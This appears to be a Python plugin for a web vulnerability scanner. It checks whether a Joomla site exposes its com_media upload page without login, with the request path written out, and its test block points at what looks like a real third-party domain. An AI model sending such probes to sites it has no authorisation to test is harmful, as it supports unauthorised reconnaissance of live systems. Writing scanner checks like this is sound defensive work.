#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Refer https://cxsecurity.com/issue/WLB-2015110194

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = 'index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and 'Upload files' in res and 'P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"' in head:
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'drugfreeclubsofamerica.com/')[1])